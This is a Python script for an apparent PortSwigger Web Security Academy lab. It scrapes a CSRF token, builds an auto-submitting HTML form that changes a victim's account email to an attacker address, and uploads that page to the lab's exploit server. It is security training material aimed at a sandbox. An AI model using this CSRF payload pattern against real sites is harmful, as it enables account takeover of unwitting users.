import requests
from bs4 import BeautifulSoup

site = '0aa700b903de8ee7803c035800d9001f.web-security-academy.net'
s = requests.Session()

# Step 1: Get CSRF token
change_url = f'https://{site}/my-account'
resp = s.get(change_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Step 2: Get the exploit server URL
home_url = f'https://{site}/'
resp = s.get(home_url)
soup = BeautifulSoup(resp.text, 'html.parser')
exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')

# Step 3: Create exploit HTML using the CSRF token we just stole (ineffective, but per exercise)
exploit_html = f'''<html>
  <body>
    <form action="https://{site}/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net">
      <input type="hidden" name="csrf" value="{csrf}">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>'''

# Step 4: Upload exploit to exploit server
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.post(exploit_url, data=formData)

print("Exploit uploaded.")
print("Now visit the exploit manually in your browser to confirm it fails (screenshot it).")
